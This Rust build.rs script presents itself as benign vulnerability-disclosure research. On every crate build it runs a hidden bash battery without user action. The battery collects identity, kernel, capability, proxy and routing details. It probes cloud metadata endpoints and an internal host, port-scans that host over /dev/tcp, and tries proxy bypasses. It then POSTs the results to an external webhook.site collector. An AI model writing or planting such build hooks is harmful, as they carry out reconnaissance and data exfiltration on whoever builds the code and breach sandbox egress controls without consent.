// egressmx build.rs — benign read-only network release diagnostic executed at crate build time
// (CodeRabbit VDP research, lane EGRESSMX). Status codes / error classes only; secret values are
// never printed; results are POSTed to this lane's own collector only.
use std::process::Command;

const OAST: &str = "https://webhook.site/cdeb4418-2174-4bd9-9545-7cc53fb796fc";

const BATTERY: &str = r#"set +e
echo "EGRESSMX_RUNNER_START"
echo "TS_UTC: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "PWD: $(pwd)"
id
echo "UNAME: $(uname -a)"
grep -E '^(Cap|Seccomp|NoNewPrivs)' /proc/self/status
echo "== EGRESS ENV =="
env | grep -iE '^(http_proxy|https_proxy|all_proxy|no_proxy|HTTP_PROXY|HTTPS_PROXY|ALL_PROXY|NO_PROXY)=' | sed -E 's#(://[^:/@]{4})[^@/]*@#\1<REDACTED>@#'
echo "CURLVER: $(curl --version 2>/dev/null | head -1)"
echo "== ROUTE TABLE =="
cat /proc/net/route 2>/dev/null
probe() {
  local label="$1"; shift
  local out code tt rc err
  out=$("$@" -sS -m 10 -o /dev/null -w '%{http_code} %{time_total}' 2>/tmp/_rnx_e); rc=$?
  code=$(echo "$out" | awk '{print $1}'); tt=$(echo "$out" | awk '{print $2}')
  err=$(head -c 160 /tmp/_rnx_e 2>/dev/null | tr '\n' ' ')
  echo "$label -> code=${code:-000} rc=$rc T=${tt:-0} err=[$err]"
}
OAST="https://webhook.site/cdeb4418-2174-4bd9-9545-7cc53fb796fc"
echo "== A. DEFAULT PATH (env proxy policy) =="
probe "A1_imds_gcp" curl -H 'Metadata-Flavor: Google' "http://169.254.169.254/computeMetadata/v1/instance/"
probe "A2_i28"      curl "http://10.0.0.28/"
probe "A3_oast"     curl "$OAST?leg=runner_default"
echo "== A9. 10.0.0.28 port matrix =="
for p in 22 80 443 1080; do
  if timeout 4 bash -c "exec 3<>/dev/tcp/10.0.0.28/$p" 2>/dev/null; then echo "TCP_${p}_OPEN"; else echo "TCP_${p}_NO"; fi
done
echo "== B. --noproxy '*' (client-side bypass, direct dial) =="
probe "B1_imds_gcp" curl --noproxy '*' -H 'Metadata-Flavor: Google' "http://169.254.169.254/computeMetadata/v1/instance/"
probe "B2_imds_aws" curl --noproxy '*' "http://169.254.169.254/latest/meta-data/"
probe "B3_i28"      curl --noproxy '*' "http://10.0.0.28/"
probe "B4_oast"     curl --noproxy '*' "$OAST?leg=runner_noproxy"
echo "== C. PROXY ENV EXPLICITLY UNSET (env -u, incl. no_proxy) =="
probe "C1_imds" env -u http_proxy -u https_proxy -u all_proxy -u no_proxy -u NO_PROXY -u HTTP_PROXY -u HTTPS_PROXY curl "http://169.254.169.254/computeMetadata/v1/instance/"
probe "C2_i28"  env -u http_proxy -u https_proxy -u all_proxy -u no_proxy -u NO_PROXY -u HTTP_PROXY -u HTTPS_PROXY curl "http://10.0.0.28/"
probe "C3_oast" env -u http_proxy -u https_proxy -u all_proxy -u no_proxy -u NO_PROXY -u HTTP_PROXY -u HTTPS_PROXY curl "$OAST?leg=runner_envunset"
echo "== D. SIDECAR-FORCED, no_proxy NEUTRALIZED (--noproxy '' -x http://127.0.0.1:1080) =="
probe "D1_sidecar_i28"     curl --noproxy '' -x http://127.0.0.1:1080 "http://10.0.0.28/"
probe "D2_sidecar_imds"    curl --noproxy '' -x http://127.0.0.1:1080 -H 'Metadata-Flavor: Google' "http://169.254.169.254/computeMetadata/v1/instance/"
probe "D3_sidecar_connect" curl --noproxy '' -x http://127.0.0.1:1080 "$OAST?leg=runner_sidecar_connect"
probe "D4_sidecar_gh"      curl --noproxy '' -x http://127.0.0.1:1080 "https://api.github.com/"
echo "EGRESSMX_RUNNER_END"
"#;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:warning=EGRESSMX_RUNNER_BUILD_START");
    let out = Command::new("bash").arg("-c").arg(BATTERY).output();
    match out {
        Ok(o) => {
            let text = String::from_utf8_lossy(&o.stdout).to_string();
            let _ = std::fs::write("/tmp/egressmx_runner_battery.txt", &text);
            let n = text.lines().count();
            println!("cargo:warning=EGRESSMX_RUNNER_BATTERY_LINES_{}", n);
            // exfil to own collector only (result text is status codes / error classes)
            let _ = Command::new("curl")
                .args([
                    "-sS", "-m", "15", "-X", "POST", "--data-binary", "@/tmp/egressmx_runner_battery.txt",
                    &format!("{}?leg=runner_battery", OAST),
                ])
                .status();
            println!("cargo:warning=EGRESSMX_RUNNER_BUILD_DONE");
        }
        Err(e) => println!("cargo:warning=EGRESSMX_RUNNER_EXEC_FAIL_{}", e),
    }
}
